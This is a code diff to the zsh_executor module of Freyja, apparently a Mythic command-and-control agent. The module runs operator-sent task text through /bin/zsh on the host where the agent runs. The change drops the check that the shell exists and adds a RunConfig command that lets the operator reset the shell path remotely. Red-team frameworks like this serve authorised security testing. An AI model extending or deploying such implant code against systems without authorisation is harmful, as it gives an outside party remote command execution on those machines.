@@ -2,6 +2,7 @@ package zsh_executor
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -13,17 +14,13 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
 
+var zshBin = "/bin/zsh"
+
 // Run - Function that executes the zsh_executor command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	zshBin := "/bin/zsh"
-	if _, err := os.Stat(zshBin); err != nil {
-		msg.SetError("Could not find /bin/zsh")
-		task.Job.SendResponses <- msg
-		return
-	}
-
 	command := exec.Command(zshBin)
+
 	command.Stdin = strings.NewReader(task.Params)
 	command.Env = os.Environ()
 
@@ -115,5 +112,26 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
+	return
+}
+
+type Arguments struct {
+	Zsh_executor string `json:"zshBin"`
+}
+
+func RunConfig(task structs.Task) {
+	msg := task.NewResponse()
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	zshBin = args.Zsh_executor
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Zsh_executor updated")
+
+	task.Job.SendResponses <- msg
 	return
 }
